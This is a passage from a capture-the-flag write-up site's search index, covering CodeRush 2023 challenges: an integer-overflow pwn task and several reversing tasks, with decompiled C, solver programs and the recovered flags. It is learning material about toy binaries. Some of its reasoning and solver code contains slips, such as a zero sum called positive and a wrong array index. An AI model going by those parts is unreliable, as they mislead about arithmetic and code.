<code>coderush{t0d@y_@_533d_70m0rr0w_@7r33}</code></p>","tags":["pwn","coderush","2023","rand"]},{"location":"writeups/2023/coderush/pwn/three_sum/index.html","title":"Three Sum","text":"","tags":["pwn","coderush","2023"]},{"location":"writeups/2023/coderush/pwn/three_sum/index.html#description","title":"Description","text":"<p>I hope ye'all have done this challenge where you sum up two numbers. But don't you think that <code>three</code> makes a lot more sense than <code>two</code>? We will make things right by adding up three numbers to make it awe sum.</p> <p>Access the server with: <code>nc 139.59.0.163 3555</code></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p> <p>chal</p>","tags":["pwn","coderush","2023"]},{"location":"writeups/2023/coderush/pwn/three_sum/index.html#solution","title":"Solution","text":"<p>We are given a binary. Let's load it into Ghidra.</p> Ghidra_black_magic C<pre><code>int overflew(int sum,int n1,int n2,int n3){\nint r;\nif ((((n1 &lt; 1) || (n2 &lt; 1)) || (n3 &lt; 1)) || (0 &lt; sum)) {\nr = 0;\n}\nelse {\nr = 1;\n}\nreturn r;\n}\nint main(void){\nint s;\nlong in_FS_OFFSET;\nuint n1;\nuint n2;\nuint n3;\nint sum;\nFILE *file;\nchar flag [72];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\nputs(\"n1 &gt; n1 + n2 + n3 AND n2 &gt; n1 + n2 + n3 AND n3 &gt; n1 + n2 + n3\");\nfflush(stdout);\nputs(\"What three positive numbers can make this possible: \");\nfflush(stdout);\ns = __isoc99_scanf(&amp;DAT_0010207d,&amp;n1);\nif (s != 0) {\ns = __isoc99_scanf(&amp;DAT_0010207d,&amp;n2);\nif (s != 0) {\ns = __isoc99_scanf(&amp;DAT_0010207d,&amp;n3);\nif (s != 0) {\nprintf(\"You entered %d, %d and %d\\n\",n1,n2,n3);\nfflush(stdout);\nsum = n3 + n1 + n2;\ns = overflew(sum,n1,n2,n3);\nif (s != 0) {\nputs(\"You have an integer overflow.\");\nfflush(stdout);\n/* WARNING: Subroutine does not return */\nexit(0);\n}\nputs(\"Is there no overflow?\");\nputs(\"OR is the cpu trippin?\");\nfflush(stdout);\nif ((((sum &lt; n1) &amp;&amp; (sum &lt; n2)) &amp;&amp; (sum &lt; n3)) &amp;&amp;\n(((0 &lt; n1 &amp;&amp; (0 &lt; n2)) &amp;&amp; (0 &lt; n3)))) {\nfile = fopen(\"flag.txt\",\"r\");\nif (file == NULL) {\nputs(\"flag not found.\");\nputs(\n\"If you are running this on the remote server, contact the admin immedia tely.\"\n);\nputs(\n\"If you are running this on your local machine, create a flag.txt with a  dummy flag for debugging purpose.\"\n);\nfflush(stdout);\n/* WARNING: Subroutine does not return */\nexit(0);\n}\nfgets(flag,59,file);\nprintf(\"YOUR FLAG IS: %s\\n\",flag);\nfflush(stdout);\n/* WARNING: Subroutine does not return */\nexit(0);\n}\nputs(\"Then again, where is the flag?\");\n}\n}\n}\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn 0;\n}\n</code></pre> <p>The program does nothing out of ordinary. It takes Three integers as input, adds them up and checks if the result has caused any overflow or not with the <code>overflew</code> function. The way it checks for overflow is by the following condition: <code>(((n1 &lt; 1) || (n2 &lt; 1)) || (n3 &lt; 1)) || (0 &lt; sum)</code>. So, by this function, overflow occurs if either the sum is less than 0 or any one of the numbers is less than 1. By sane logic it might be hard to get that how can you add three poisitive integers greater than 0 but still get a sum greater than zero that is somehow less than any one of the integers that were added. But if we talk about computers, <code>meh</code>.</p> <p>Integers are 32 bit long. if the result is to be greater than zero then the <code>sign</code> bit needs to be zero in the result. Now, how can we do it? Let's look at the following example for 8 bit signed integer:</p> <p><code>0b01100000</code> =&gt; <code>n1</code></p> <p><code>0b01100000</code> =&gt; <code>n2</code></p> <p><code>0b01000000</code> =&gt; <code>n3</code></p> <p><code>0b00000000</code> =&gt; <code>sum</code></p> <p>how this happens? well the original result would be: <code>0b100000000</code> in <code>9</code> bit. But the extra 1 has to be removed. Now, we are left with only 0 as sum. Thus having sum less than any of the given numbers and also the sum being greater than 0. The same logic applies for 32bit integers. So, to get 0 as sum, we need any three positive numbers whose sum add up to at least <code>2&lt;&lt;32 + 1</code> as the sum needs to be greater than zero.</p> <p></p>","tags":["pwn","coderush","2023"]},{"location":"writeups/2023/coderush/rev/Cake/index.html","title":"Chocolate Cake","text":"","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#description","title":"Description","text":"<p>I found the best recipe for Cake in the world. But this recipe needs a secret ingredient which I don't know. Help me discover the hidden secrets of this recipe and I will make the best cake for you.</p> <p>You can access the kitchen with <code>nc 139.59.0.163 1740</code></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#solution","title":"Solution","text":"<p>The recipe wants a secret ingredient when executed. Let's see what we can see in Ghidra. I have done some light renaming and so on. now let's try to recreate the recipe. It's pretty amazing how much similar the decompiled source is compared to the actual source code.</p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#ghidra-black-magic","title":"Ghidra black magic","text":"Recipe_from_ghidra C<pre><code>byte taste_cake(char *cake)\n{\nint i;\nchar some_cake [23];\nbyte f;\nsome_cake._0_8_ = 0x1070426e70144e3c;\nsome_cake._8_7_ = 0x5413116e370e29;\nsome_cake[15] = 0x74;\nsome_cake._16_7_ = 0x6a356833540227;\nf = 1;\nfor (i = 0; i &lt; secret_len; i += 1) {\nf &amp;= cake[i] == some_cake[i];\n}\nif (*(in_FS_OFFSET + 40) != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn f;\n}\nvoid serve_the_cake(char *cake)\n{\nint tasty;\nFILE *file;\nlong in_FS_OFFSET;\nchar flag [72];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\ntasty = taste_cake(cake);\nif (tasty != 1) {\nputs(\"You cannot just make a secret ingredient up. (-_-)\");\n/* WARNING: Subroutine does not return */\nexit(0);\n}\nfile = fopen(\"flag.txt\",\"r\");\nif (file == NULL) {\nputs(\"file not found\\n\");\nputs(\"If you are on a remote server contact the admin asap.\");\nputs(\"If you are on your local machine, create a flag.txt so that you can debug easily.\");\n/* WARNING: Subroutine does not return */\nexit(1);\n}\nfgets(flag,64,file);\nputs(flag);\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn;\n}\nvoid bake_and_frost(char *secret_ingredient)\n{\nint i;\nint j;\nputs(\"bakin...\");\nputs(\"done...\");\nfor (i = 0; i &lt; 2 &lt;&lt; (secret_len &amp; 31); i += 1) {\nfor (j = 0; j &lt; secret_len; j += 1) {\nsecret_ingredient[j] =\nsecret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n}\n}\nputs(\"frostin...\");\nputs(\"done...\");\nreturn;\n}\nvoid whisk_and_mix(char *secret_ingredient)\n{\nint i;\nint j;\nint k;\nputs(\"whiskin...\");\nputs(\"done\");\nfor (i = 0; i &lt; secret_len / 2; i += 1) {\nfor (j = 0; j &lt; secret_len; j += 1) {\nsecret_ingredient[j] =\nsecret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\nk = (j + secret_len + -1) % secret_len;\nsecret_ingredient[k] = secret_ingredient[k] ^ secret_ingredient[j];\nsecret_ingredient[j] =\nsecret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n}\n}\nputs(\"mixin...\");\nputs(\"done\");\nreturn;\n}\nvoid prepare(char *secret_ingredient)\n{\nint i;\nputs(\"prepin...\");\nfor (i = 0; i &lt; secret_len; i += 1) {\nsecret_ingredient[i] =\nsecret_ingredient[i] + -84 + ((secret_ingredient[i] + -84) / 26) * -26 + 'a';\n}\nputs(\"done\");\nreturn;\n}\nchar * bake_a_cake(char *secret_ingredient)\n{\nlong in_FS_OFFSET;\nint i;\ncode *recipe [3];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\nrecipe[0] = prepare;\nrecipe[1] = whisk_and_mix;\nrecipe[2] = bake_and_frost;\nfor (i = 0; i &lt; 3; i += 1) {\n(*recipe[i])(secret_ingredient);\n}\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn secret_ingredient;\n}\nint main(void)\n{\nchar c;\nsize_t sVar1;\nchar *cake;\nlong in_FS_OFFSET;\nint i;\nchar secret_ingredient [40];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\nputs(\"The best cake has the best of secret ingredients\");\nputs(\"What is your best secret ingredient?\");\nread(1,secret_ingredient,32);\nfor (i = 0; i &lt; 32; i += 1) {\nif (secret_ingredient[i] == '\\n') {\nc = '\\0';\n}\nelse {\nc = secret_ingredient[i];\n}\nsecret_ingredient[i] = c;\n}\nsVar1 = strlen(secret_ingredient);\nsecret_len = sVar1;\nif (secret_len != 23) {\nputs(\"You are not someone who is supposed to know the super secret ingredient.\");\n/* WARNING: Subroutine does not return */\nexit(0);\n}\ncake = bake_a_cake(secret_ingredient);\nserve_the_cake(cake);\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn 0;\n}\n</code></pre>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#function-breakdown","title":"Function breakdown","text":"","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#main","title":"main","text":"Main C<pre><code>int main(){\nchar c;\nsize_t sVar1;\nchar *cake;\nlong in_FS_OFFSET;\nint i;\nchar secret_ingredient [40];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\nputs(\"The best cake has the best of secret ingredients\");\nputs(\"What is your best secret ingredient?\");\nread(1,secret_ingredient,32);\nfor (i = 0; i &lt; 32; i += 1) {\nif (secret_ingredient[i] == '\\n') {\nc = '\\0';\n}\nelse {\nc = secret_ingredient[i];\n}\nsecret_ingredient[i] = c;\n}\nsVar1 = strlen(secret_ingredient);\nsecret_len = sVar1;\nif (secret_len != 23) {\nputs(\"You are not someone who is supposed to know the super secret ingredient.\");\n/* WARNING: Subroutine does not return */\nexit(0);\n}\ncake = bake_a_cake(secret_ingredient);\nserve_the_cake(cake);\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn 0;\n}\n</code></pre> <p>The main function takes the <code>secret_ingredient</code> using read function. Then checks for length. So, we know that the length of the secret_ingredient is 23. then there is a call to <code>bake_a_cake(secret_ingredient)</code>. the function returns a <code>cake</code> and the <code>cake</code> is then served by <code>serve_the_cake(cake)</code> function. We now write a function that will do the opposite of what the main function does in another main function. C<pre><code>int main(){\nchar* cake = get_a_cake();  //get the cake from serve_the_cake(cake) function\nchar* secret_ingredient = cake_a_bake(cake);\npreserve(secret_ingredient);\n}\n</code></pre> As we saw in <code>serve_the_cake</code> function, the function compares the output of <code>bake_a_cake</code> with a premade cake inside <code>taste_cake</code> and returns 1 or 0. so, we can later just take the cake from taste_cake function and find out the secret_ingredient from the cake.</p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#bake_a_cake","title":"bake_a_cake","text":"Bake_a_cake C<pre><code>char* bake_a_cake(char* secret_ingredient){\nlong in_FS_OFFSET;\nint i;\ncode *recipe [3];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\nrecipe[0] = prepare;\nrecipe[1] = whisk_and_mix;\nrecipe[2] = bake_and_frost;\nfor (i = 0; i &lt; 3; i += 1) {\n(*recipe[i])(secret_ingredient);\n}\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn secret_ingredient;\n}\n</code></pre> <p>It has an interesting type that is <code>code*</code> for those of you who do not know, <code>code*</code> is basically a function pointer. How code pointer is function pointer is not the part of discussion. This function first initializes an array of function pointers with addresses of functions in order. Then using a for loop, the functions are being called by giving the secret_ingredient as a parameter to the function. These functions use the secret_ingredient and then returns the secret ingredient as cake. Now, let's write a function that will take a <code>cake</code> as input and will give a <code>secret_ingredient</code> as output.</p> C<pre><code>char* cake_a_bake(char* cake){\nvoid (*recipe[3])(char*) = {defrost_and_dake, seperate_and_dwadle, wait};\nfor(int i = 0; i&lt; 3; i++){\n(*recipe[i])(cake);\n}\nreturn cake;\n}\n</code></pre>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#prepare","title":"prepare","text":"Prepare C<pre><code>char* prepare(char* secret_ingredient){\nint i;\nputs(\"prepin...\");\nfor (i = 0; i &lt; secret_len; i += 1) {\nsecret_ingredient[i] =\nsecret_ingredient[i] + -84 + ((secret_ingredient[i] + -84) / 26) * -26 + 'a';\n}\nputs(\"done\");\nreturn;\n}\n</code></pre> <p>we see a loop that modifies our secret_ingredient. At first, it looks like whatever is happening inside the loop  does not look good. But if you look closely, if we take <code>secret_ingredient[i]-84</code> as <code>z</code>, the expression becomes: C<pre><code>secret_ingredient[i] = z - (z / 26) * 26 + 'a'\n</code></pre> I don't know if any of you ever found reminder using the above method, but i did. We can rewrite the above expression as follows: C<pre><code>secret_ingredient[i] = z % 26 + 'a'\n</code></pre> Now, seeing 26 as the constant, we can assume that the output of <code>secret_igredient[i]</code> is also going to be a character but something added to 'a'. Now, let's breakdown <code>z</code>.</p> <p><code>z = secret_ingredient[i] - 84</code></p> <p>I wanted to see what happens to the characters after this whole transformation of <code>prepare</code> function. Look what I found:</p> <p></p> <p>The function does <code>rot13</code> on each characters. so, another simple rot13 would bring back the input from the output. Now, it's time to write <code>wait</code> function as designed by cake_a_bake function: C<pre><code>void wait(char* cake){\nfor(int i=0;i&lt;secret_len;i++){\ncake[i] = 'a' + (cake[i]-84)%26;\n}\n}\n</code></pre></p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#whisk_and_mix","title":"whisk_and_mix","text":"Whisk_and_mix C<pre><code>void whisk_and_mix(char* secret_ingredient){\nint i;\nint j;\nint k;\nputs(\"whiskin...\");\nputs(\"done\");\nfor (i = 0; i &lt; secret_len / 2; i += 1) {\nfor (j = 0; j &lt; secret_len; j += 1) {\nsecret_ingredient[j] =\nsecret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\nk = (j + secret_len + -1) % secret_len;\nsecret_ingredient[k] = secret_ingredient[k] ^ secret_ingredient[j];\nsecret_ingredient[j] =\nsecret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n}\n}\nputs(\"mixin...\");\nputs(\"done\");\nreturn;\n}\n</code></pre> <p>Our secret_len/2 is 11. so, the outer loop loops 11 times. the inner loop runs for every characters in the secret_ingredient. Let's see what happens in the inner loop after cleaning a bit: C<pre><code>k = (j+secret_len -1) % secret_len;\nsecret_ingredient[j] ^= secret_ingredient[k];\nsecret_ingredient[k] ^= secret_ingredient[j];\nsecret_ingredient[j] ^= secret_ingredient[k];\n</code></pre> for j=0; k=secret_len-1; and the inside working is inplace swapping of the jth character with it's previous character. So, after swapping all characters in the inner loop, the whole secret_ingredient is cyclic shifted left by one character. And it occurs 11 times. So, to revert our original secret ingredient, we need to cyclic right shift 11 times. The <code>separate_and_dwadle</code> function can be written as:</p> C<pre><code>void separate_and_deadle(char* cake){\nfor(int i=0;i&lt;secret_len/2;i++){\nfor(int j=secret_len-1;j&gt;=0;j--){\nk = (j+secret_len -1) % secret_len;\ncake[j] ^= cake[k];\ncake[k] ^= cake[j];\ncake[j] ^= cake[k];\n}\n}\n}\n</code></pre>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#bake_and_frost","title":"bake_and_frost","text":"Bake_and_frost C<pre><code>void bake_and_frost(char* secret_ingredient){\nint i;\nint j;\nputs(\"bakin...\");\nputs(\"done...\");\nfor (i = 0; i &lt; 2 &lt;&lt; (secret_len &amp; 31); i += 1) {\nfor (j = 0; j &lt; secret_len; j += 1) {\nsecret_ingredient[j] =\nsecret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n}\n}\nputs(\"frostin...\");\nputs(\"done...\");\nreturn;\n}\n</code></pre> <p>The bake and frost function does the following to every characters of the secret_ingredient from first to last 2^23 times: C<pre><code>secret_ingredient[j] ^= secret_ingredient[(j + secret_len - 1) % secret_len];\n</code></pre> Each char in secret_ingredient is xored with it's previous char. To reverse this, we write the following function: C<pre><code>void defrost_and_dake(char* cake){\nfor(int i=0;i&lt;(2&lt;&lt;23);i++){\nfor(int j=secret_len-1;j&gt;=0;j--){\ncake[i] ^= cake[(j + secret_len - 1) % secret_len];\n}\n}\n}\n</code></pre></p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Cake/index.html#serve_the_cake-and-taste_cake","title":"serve_the_cake and taste_cake","text":"Serve_the_cake C<pre><code>void serve_the_cake(char* cake){\nint tasty;\nFILE *file;\nlong in_FS_OFFSET;\nchar flag [72];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\ntasty = taste_cake(cake);\nif (tasty != 1) {\nputs(\"You cannot just make a secret ingredient up. (-_-)\");\n/* WARNING: Subroutine does not return */\nexit(0);\n}\nfile = fopen(\"flag.txt\",\"r\");\nif (file == NULL) {\nputs(\"file not found\\n\");\nputs(\"If you are on a remote server contact the admin asap.\");\nputs(\"If you are on your local machine, create a flag.txt so that you can debug easily.\");\n/* WARNING: Subroutine does not return */\nexit(1);\n}\nfgets(flag,64,file);\nputs(flag);\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn;\n}\n</code></pre> <p>this function is our target. upon successfully getting 1 from taste_cake, we will recieve the flag.txt from the server.</p> Taste_cake C<pre><code>byte taste_cake(char* cake){\nint i;\nchar some_cake [23];\nbyte f;\nsome_cake._0_8_ = 0x1070426e70144e3c;\nsome_cake._8_7_ = 0x5413116e370e29;\nsome_cake[15] = 0x74;\nsome_cake._16_7_ = 0x6a356833540227;\nf = 1;\nfor (i = 0; i &lt; secret_len; i += 1) {\nf &amp;= cake[i] == some_cake[i];\n}\nif (*(in_FS_OFFSET + 40) != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn f;\n}\n</code></pre> <p>Though it feels weird, the 23 consecutive bytes in some_cake needs to be extracted byte by byte for us to reconstruct the cake. We have to take note of endianness and reverse each 8 bytes to get the correct order.</p> <p>Now, the <code>get_cake</code> function will be as follows: C<pre><code>char* get_cake(){\nchar* some_cake = (char*)malloc(sizeof(char) * 23);\nsome_cake[0] = 0x3c;\nsome_cake[1] = 0x4e;\nsome_cake[2] = 0x14;\nsome_cake[3] = 0x70;\nsome_cake[4] = 0x6e;\nsome_cake[5] = 0x42;\nsome_cake[6] = 0x70;\nsome_cake[7] = 0x10;\nsome_cake[8] = 0x29;\nsome_cake[9] = 0x0e;\nsome_cake[10] = 0x37;\nsome_cake[11] = 0x6e;\nsome_cake[12] = 0x11;\nsome_cake[13] = 0x13;\nsome_cake[14] = 0x54;\nsome_cake[15] = 0x74;\nsome_cake[16] = 0x27;\nsome_cake[17] = 0x02;\nsome_cake[18] = 0x54;\nsome_cake[19] = 0x33;\nsome_cake[20] = 0x68;\nsome_cake[21] = 0x35;\nsome_cake[22] = 0x6a;\nreturn some_cake;\n}\n</code></pre> We now pass the cake to cake_a_bake and then get a secret_ingredient. we then preserve the secret_ingredient.</p> C<pre><code>void preserve(char* secret_ingredient){\nfor(int i=0; i&lt;secret_len;i++){\nprintf(\"%c\",secret_ingredient[i]);\n}\n}\n</code></pre> <p>Now, we have all the required to retrieve the secret_ingredient from the cake. the following c file computes the secret_ingredient from the cake.</p> <p>secret</p> <p>Now, we hit a wall of disappointment.</p> <p></p> <p>We can assume that we messed up somewhere bigtime. But upon further observation of the reversal code, everything seems to be okay. But there is a catch. all the letters in the input are rotated whether they are between <code>a</code> and <code>z</code> or not. My guess is that there were some characters in the secret_ingredient that were not in the range <code>a~z</code> so, rot13 becomes reversible for only those who were between <code>a~z</code> and irreversible for those who were not. Now, we change the secret code a little in our recipe, we do the following: C<pre><code>char* cake_a_bake(char* cake){\nvoid (*recipe[3])(char*) = {defrost_and_dake, seperate_and_dwadle, wait};\nfor(int i = 0; i&lt; 2; i++){\n(*recipe[i])(cake);\n}\nreturn cake;\n}\n</code></pre> This way, we will now get the secret ingredient before it was rotated. The string we get is: <code>\\hcZel\\ZpeZ^lXateZqXZa^</code> we head over to cyberchef and only do rot13 on characters.</p> <p>The string we get is: <code>\\upMry\\McrM^yKngrMdKMn^</code></p> <p>The previous secret we go was: <code>iupgryigcrgkyengrgdegnk</code></p> <p>If we compare the two, we can see that some characters appear at exactly the same position as the other one. Now, we keep them as they are highly likely the original characters, not the 1337 converted to characters. <code>_up_ry__cr__y_ngr_d__n_</code>.</p> <p>Not too clear what it exactly means. Now, we need to make a cake of only most probable 1337 codes to guess what 1337 code was used for the recipe. We make the following change in the code of 1 <code>cake_a_bake</code>:</p> <p>When we put <code>134570!@_</code> in wait, we get the following output: <code>XZ[\\^WHMl</code>; Now, we can replace occurances of any of <code>XZ[\\^WHMl</code> with it's corresponding 1337 code in <code>\\hcZel\\ZpeZ^lXateZqXZa^</code>. After adding it with <code>_up_ry__cr__y_ngr_d__n_</code> we get: <code>5up3ry53cr37y1ngr3d13n7</code>. aslo, see that both <code>l</code> and <code>_</code> are converted to <code>y</code> upon rot13. so, we can safely assume that the secret was: <code>5up3r_53cr37_1ngr3d13n7</code>.</p> <p>Annd voila we got our flag:</p> <p></p> <p>flag: <code>coderush{7h3_c@k3_w@5_5up3r_d3l15h}</code></p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Nest/index.html","title":"Nest","text":"","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Nest/index.html#description","title":"Description","text":"<p>Winter fades, spring awakes, The cuckoo sings, the earth shakes, Summer's near, but first a rest, A nest to build, with utmost zest.</p> <p></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p> <p>nest</p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/Nest/index.html#solution","title":"Solution","text":"<p>We are given a binary ELF x64 executable. it asks for an input. presumably for the flag. after opening the file in ghidra and renaming a couple of variables, we get the following c like source code: C<pre><code>/* DISPLAY WARNING: Type casts are NOT being printed */\nundefined8 main(void)\n{\nchar c;\nlong in_FS_OFFSET;\nint i;\nchar flag [40];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\nread(1,flag,37);\nfor (i = 0; i &lt; 37; i += 1) {\nif (flag[i] == '\\n') {\nc = '\\0';\n}\nelse {\nc = flag[i];\n}\nflag[i] = c;\n}\nif (flag[36] == '}' &amp;&amp;\n(flag[6] == 's' &amp;&amp;\n(flag[25] == '5' &amp;&amp;\n(flag[2] == 'd' &amp;&amp;\n(flag[27] == '1' &amp;&amp;\n(flag[0] == 'c' &amp;&amp;\n(flag[21] == 'c' &amp;&amp;\n(flag[17] == 'n' &amp;&amp;\n(flag[4] == 'r' &amp;&amp;\n(flag[29] == '_' &amp;&amp;\n(flag[20] == '_' &amp;&amp;\n(flag[13] == '0' &amp;&amp;\n(flag[32] == 'r' &amp;&amp;\n(flag[11] == 'c' &amp;&amp;\n(flag[3] == 'e' &amp;&amp;\n(flag[30] == '5' &amp;&amp;\n(flag[26] == '_' &amp;&amp;\n(flag[15] == '_' &amp;&amp;\n(flag[8] == '{' &amp;&amp;\n(flag[35] == 'g' &amp;&amp;\n(flag[28] == 'n' &amp;&amp;\n(flag[16] == '0' &amp;&amp;\n(flag[18] == 'l' &amp;&amp;\n(flag[24] == '3' &amp;&amp;\n(flag[22] == '0' &amp;&amp;\n(flag[23] == 'm' &amp;&amp;\n(flag[31] == 'p' &amp;&amp;\n(flag[14] == '0' &amp;&amp;\n(flag[1] == 'o' &amp;&amp;\n(flag[33] == '1' &amp;&amp;\n(flag[12] == 'k' &amp;&amp;\n(flag[10] == 'u' &amp;&amp;\n(flag[5] == 'u' &amp;&amp;\n(flag[7] == 'h' &amp;&amp; (flag[9] == 'c' &amp;&amp; (flag[34] == 'n' &amp;&amp; flag[19] == 'y')))))))))))))))))))\n))))))))))))))))) {\nputs(\"Yes! That\\'s the saying.\");\n}\nelse {\nputs(\"No, that\\'s not the saying.\");\n}\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn 0;\n}\n</code></pre></p> <p>So, from the source code, it is obvious that the flags characters are being checked without order. we bring it in order or just write the following c code to get the flag: C<pre><code>int main(){\nchar flag [41];\nflag[36] = '}';\nflag[6] = 's';\nflag[25] = '5';\nflag[2] = 'd';\nflag[27] = '1';\nflag[0] = 'c';\nflag[21] = 'c';\nflag[17] = 'n';\nflag[4] = 'r';\nflag[29] = '_';\nflag[20] = '_';\nflag[13] = '0';\nflag[32] = 'r';\nflag[11] = 'c';\nflag[3] = 'e';\nflag[30] = '5';\nflag[26] = '_';\nflag[15] = '_';\nflag[8] = '{';\nflag[35] = 'g';\nflag[28] = 'n';\nflag[16] = '0';\nflag[18] = 'l';\nflag[24] = '3';\nflag[22] = '0';\nflag[23] = 'm';\nflag[31] = 'p';\nflag[14] = '0';\nflag[1] = 'o';\nflag[33] = '1';\nflag[12] = 'k';\nflag[10] = 'u';\nflag[5] = 'u';\nflag[7] = 'h';\nflag[9] = 'c';\nflag[34] = 'n';\nflag[19] = 'y';\nputs(flag);\nreturn 0;\n}\n</code></pre></p> <p>The flag is : <code>coderush{cuck00_0nly_c0m35_1n_5pr1ng}</code></p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/keasy/index.html","title":"Keasy","text":"","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/keasy/index.html#description","title":"Description","text":"<p>I am a fan of random numbers. I encrypted the flag with a random key. I then threw the key into the <code>/dev/null</code> blackhole. Now I can't retrieve the flag. But I heard your team specializes in retrieving keys from there.</p> <p>Like Napoleon Once said: <code>Give me the key. I shall give you the flag.</code></p> <p>This file has the encrypted flag in it. You can also use this file to decrypt the flag.</p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/keasy/index.html#hint","title":"Hint","text":"<p>The key does not necessarily have to be comprised of printable ascii characters.</p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/keasy/index.html#solution","title":"Solution","text":"<p>Let's use ghidra to look at the decompiled source.</p> <p></p> <p></p> <p>We can see that the encryption or decryption in place is simple xor cicle. Now the tricky part is there is no clue given as to what we need to xor with to get the original flag or the key. As if one can be obtained, the other unknown can be obtained by simply xoring them. C<pre><code>x ^ y = z\nz ^ x = y\ny ^ z = x\n</code></pre> But we have another clue in the shadows though. The flag format is <code>coderush{flag}</code> we can see that the first 8 characters of the flag will be <code>coderush</code>. And also the key is also 8 chars long. So, the first 8 bytes of the encrypted flag i.e, <code>0x271056073f596139</code> can be xored with 'coderush' to get the key and we can then pass the key to the program who will give us the full flag.</p> <p>The following c program will find out the key:</p> <p>C<pre><code>#include &lt;stdio.h&gt;\nvoid solve(char* a, char* b, int len) {\nfor (int i = 0; i &lt; len; i++) {\nprintf(\"%c\",a[i]^b[i]);\n}\n}\nint main() {\nlong bytes = 0x271056073f596139;\nchar known[] = \"coderush\";\nsolve(&amp;bytes,known,8);\n}\n</code></pre> After compiling the program, we run the program and pipe the output to keasy. Bash<pre><code>./sol | ./keasy\n</code></pre> flag: <code>coderush{ru5h_0f_n@p0l30n}</code></p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/matrix/index.html","title":"Matrix","text":"","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/matrix/index.html#description","title":"Description","text":"<p>Matrix is inevitable. Escape the <code>Matrix</code>.</p> <p>Author: <code>gr007</code></p> <p>matrix</p>","tags":["rev","2023","flaghunt"]},{"location":"writeups/2023/coderush/rev/matrix/index.html#solution","title":"Solution","text":"<p>We are given the <code>matrix</code> binary that asks for the one last thing that we have to say. Presumably that has to be the flag in order to escape the matrix. We open the binary in ghidra and look at what the source code looks like:</p> <p>The following part of code is interesting. Because this part is our goal: C<pre><code>    f = true;\nfor (j = 0; j &lt; 40; j += 1) {\nsum = 0;\nfor (k = 0; k &lt; 32; k += 1) {\nsum += flag[k] * matrix[k + j * 32];\n}\nf = f &amp; sum == B[j];\n}\nif (f) {\nputs(\"You sure can escape the matrix\");\n}\nelse {\nputs(\"You shall never escape the matrix\");\n}\n</code></pre></p> <p>So, what is happening is that the flag that is input is being taken as if it were <code>X</code> in a matrix multiplication equation for <code>AX = B</code>. We have <code>B</code> matrix with which the result is being compared with. and also the A matrix with which our flag is being multiplied with. Now, we can simply do <code>X = A^(-1)*B</code> to get X. But there are only 32 characters in the flag but 40 values in <code>B</code> and the matrix <code>A</code> is <code>40x32</code>. We can simply opt out any 8 row from both <code>A</code> and <code>B</code> and get the flag in 32 characters. The following python file calculates the flag: <code>sol.py</code></p> <p>flag: <code>coderush{s0_d0_y0u_l1k3_m4tr1x?}</code></p>","tags":["rev","2023","flaghunt"]},{"location":"tags.html","title":"Tags","text":""},{"location":"tags.html#2022","title":"2022","text":"<ul> 